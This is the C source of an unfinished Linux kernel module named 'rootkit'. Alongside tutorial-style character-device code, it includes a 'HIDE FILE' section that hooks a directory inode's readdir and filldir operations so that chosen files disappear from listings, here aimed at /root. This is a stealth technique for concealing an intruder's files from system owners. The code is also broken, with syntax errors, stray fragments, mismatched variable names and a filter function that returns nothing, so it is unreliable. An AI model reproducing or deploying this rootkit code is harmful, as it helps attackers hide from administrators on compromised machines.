#include <linux/module.h>	/* Needed by all modules */
#include <linux/kernel.h>	/* Needed for KERN_INFO */
#include <linux/init.h>		/* Needed for the macros */
#include <linux/fs.h>
#include <linux/namei.h>
#include <linux/path.h>
#include <linux/mount.h>
#include <asm/uaccess.h>

#include "rootkit.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Kha");

#define DEVICE_NAME "rootkit"
#define SUCCESS 0
#define BUF_LEN 80

// Global variables
static int device_open_num = 0;
static char msg[BUF_LEN];
static char *msg_ptr;

//static int device_open (struct inode *, struct file *);
//static int device_release (struct inode*, struct file*);
//static ssize_t device_read(struct file *, char __user *, size_t, loff_t *);
//static ssize_t device_write(struct file*,const char __user *, size_t, loff_t*);
//static ssize_t device_ioctl(	
//			struct file *,	
//			unsigned int ,
//			unsigned long ); 


// Methods
static ssize_t device_read(struct file * file
			   , char __user* buffer
			   , size_t length
			   , loff_t * offset){
  int bytes_read = 0;
  if (*msg_ptr == 0)
    return 0;

  while (length && *msg_ptr){
    put_user(*(msg_ptr++), buffer++);
    length--;
    bytes_read++;
  }
  printk(KERN_INFO "Read %d bytes, %ld left\n", bytes_read, length);
  return bytes_read;
}

static ssize_t device_write(struct file * file
			    , const char __user * buffer
			    , size_t length
			    , loff_t * offset){
  int i;
  //printk(KERN_INFO "device_write(%p,%s,%ld)", file, buffer, length);
  printk(KERN_INFO "device_write");
  for(i=0; i< length && i< BUF_LEN; i++){
    get_user(msg[i], buffer+i);
  }
  msg_ptr = msg;
  return i;
  //return 0;
}

static int device_open(struct inode* inode, struct file* file){
  //  static int counter = 0;
  printk(KERN_INFO "device_open(%p)\n", file);
  if(device_open_num)
    return -EBUSY;
  
  device_open_num++;
  msg_ptr = msg;
  try_module_get(THIS_MODULE);
  return SUCCESS;
}

static int device_release(struct inode *inode, struct file *file)
{
  printk(KERN_INFO "device_release(%p,%p)\n", inode, file);
  device_open_num--;		/* We're now ready for our next caller */

  module_put(THIS_MODULE);
  return SUCCESS;
}

static ssize_t device_ioctl(	/* see include/linux/fs.h */
			    struct file *file,	/* ditto */
			    unsigned int ioctl_num,	/* number and param for ioctl */
			    unsigned long ioctl_param)
{
  int i;
  char *temp;
  char ch;
  /* 
   * Switch according to the ioctl called 
   */
  switch (ioctl_num) {
  case IOCTL_SET_MSG:
    /* 
     * Receive a pointer to a message (in user space) and set that
     * to be the device's message.  Get the parameter given to 
     * ioctl by the process. 
     */
    temp = (char *)ioctl_param;

    /* 
     * Find the length of the message 
     */
    get_user(ch, temp);
    for (i = 0; ch && i < BUF_LEN; i++, temp++)
      get_user(ch, temp);

    device_write(file, (char *)ioctl_param, i, 0);
    break;

  case IOCTL_GET_MSG:
    /* 
     * Give the current message to the calling process - 
     * the parameter we got is a pointer, fill it. 
     */
    i = device_read(file, (char *)ioctl_param, 99, 0);

    /* 
     * Put a zero at the end of the buffer, so it will be 
     * properly terminated 
     */
    put_user('\0', (char *)ioctl_param + i);
    break;

  case IOCTL_GET_NTH_BYTE:
    return msg[ioctl_param];
    break;
  }

  return SUCCESS;
}

struct file_operations fops ={
			      .read = device_read
			      , .write = device_write
			      , .unlocked_ioctl = device_ioctl
			      , .open = device_open
			      , .release = device_release				     
};
/**************************HIDE FILE*************************************************/


struct dentry* g_parent_dentry;
struct path g_root_path;
int g_inode_count = 0;
unsigned long* g_inode_numbers;

void** g_old_parent_inode_pointer;
void** g_old_parent_fop_pointer;

filldir_t real_filldir; 



void allocate_memory()
{
        //g_old_inode_pointer=(void*)kmalloc(sizeof(void*),GFP_KERNEL);
        // g_old_fop_pointer=(void*)kmalloc(sizeof(void*),GFP_KERNEL);
        // g_old_iop_pointer=(void*)kmalloc(sizeof(void*),GFP_KERNEL);

        g_old_parent_inode_pointer=(void*)kmalloc(sizeof(void*),GFP_KERNEL);
        g_old_parent_fops_pointer=(void*)kmalloc(sizeof(void*),GFP_KERNEL);
           
        g_inode_numbers=(unsigned long*)kmalloc(sizeof(unsigned long),GFP_KERNEL);

}
void reallocate_memmory()
{
	/*Realloc memmory for inode number*/
	g_inode_numbers=(unsigned long*)krealloc(g_inode_numbers,sizeof(unsigned long*)*(g_inode_count+1), GFP_KERNEL);
	
	// /*Realloc memmory for old pointers*/
	// g_old_inode_pointer=(void*)krealloc(g_old_inode_pointer, sizeof(void*)*(g_inode_count+1),GFP_KERNEL);
	// g_old_fop_pointer=(void*)krealloc(g_old_fop_pointer, sizeof(void*)*(g_inode_count+1),GFP_KERNEL);
	// g_old_iop_pointer=(void*)krealloc(g_old_iop_pointer, sizeof(void*)*(g_inode_count+1),GFP_KERNEL);

  	g_old_parent_inode_pointer=(void*)krealloc(g_old_parent_inode_pointer, sizeof(void*)*(g_inode_count+1),GFP_KERNEL);
  	g_old_parent_fop_pointer=(void*)krealloc(g_old_parent_fop_pointer, sizeof(void*)*(g_inode_count+1),GFP_KERNEL);
}


static int new_filldir (void *buf,
			const char *name,
			int namelen,
			loff_t offset,
			u64 ux64,
			unsigned ino){

  unsigned int i = 0;
  struct dentry* = p_dentry;
  struct qstr current_name;
  current_name.name = name;
  current_name.len = namelen;
  current_name.hash = full_name_hash (name, namelen);

  p_dentry = d_lookup(g_parent_dentry, &current_name);

  if (p_dentry!=NULL){
    for(i = 0; i<= g_inode_count - 1; i++){
      if (g_inode_numbers[i] == p_dentry->d_inode->i_ino)
	      return 0;
    }
  }
}
static int new_parent_readdir(struct file* file,
			      void* dirent,
			      filldir_t filldir){
  g_parent_dentry = file->f_dentry;
  real_filldir = filldir;
  return  ;
}

static struct file_operations new_parent_fops =
{
  .owner=THIS_MODULE,
  .readdir=new_parent_readdir,
};

unsigned long hook_functions(const char* file_path){
  int error = 0;
  struct path path;

  error = kern_path("/root", LOOKUP_FOLLOW, &g_root_path);
  if(error){
    printk( KERN_ALERT "Can't access root\n");
		return -1;
  }
  
  error = kern_path("/root", LOOKUP_FOLLOW, &path);
  if(error){
    printk( KERN_ALERT "Can't access file\n");
		return -1;
  }
  if (g_inode_count==0)
	{
		allocate_memory();
	}

	if (g_inode_numbers==NULL)
	{
		printk( KERN_ALERT "Not enough memmory in buffer\n");
	  return -1;
	}

  /*Save pointers*/
  g_old_parent_inode_pointer[g_inode_count]=path.dentry->d_parent->d_inode;
        g_old_parent_fop_pointer[g_inode_count]=(void *)path.dentry->d_parent->d_inode->i_fop;

	/*Save inode number*/
	g_inode_numbers[g_inode_count]=path.dentry->d_inode->i_ino;
	g_inode_count=g_inode_count+1;

	reallocate_memmory();
  /*filldir hook*/
	path.dentry->d_parent->d_inode->i_fop=&new_parent_fops;

	// /* Hook of commands for file*/
	// path.dentry->d_inode->i_op=&new_iop;
	// path.dentry->d_inode->i_fop=&new_fop;
}
unsigned long backup_functions(){
  int i = 0;
  struct inode* p_inode;
  struct inode* p_parent_inode;

  for (i = 0; i< g_inode_count; i++){
    p_inode = g_old_inode_pointer[(g_inode_count-1)-i];


    p_parent_inode=g_old_parent_inode_pointer[(g_inode_count-1)-i];
		p_parent_inode->i_fop=(void *)g_old_parent_fop_pointer[(g_inode_count-1)-i];
  }

}

static char* path_name = "/home/dalo2903/test.c";

// Rootkit init & exit
static int __init rootkit_init(void)
{
  hook_functions(path_name)
  struct inode *inode;
  struct path path;
  hook
  return 0;
  /*
    int ret_val;
    ret_val = register_chrdev(MAJOR_NUM, DEVICE_NAME, &fops);
    if (ret_val < 0) {
    printk(KERN_ALERT "%s failed with %d\n",
    "Sorry, registering the character device ", ret_val);
    return ret_val;
    }

    printk(KERN_INFO "%s The major device number is %d.\n",
    "Registeration is a success", MAJOR_NUM);
    printk(KERN_INFO "If you want to talk to the device driver,\n");
    printk(KERN_INFO "you'll have to create a device file. \n");
    printk(KERN_INFO "We suggest you use:\n");
    printk(KERN_INFO "mknod %s c %d 0\n", DEVICE_FILE_NAME, MAJOR_NUM);
    sprintf(msg, "Starting text\n");*/
  return 0;
}

static void __exit rootkit_exit(void)
{/*
   unregister_chrdev(MAJOR_NUM, DEVICE_NAME);
  
   printk(KERN_INFO "Rootkit unloaded\n");
 */
  return;
}

module_init(rootkit_init);
module_exit(rootkit_exit);
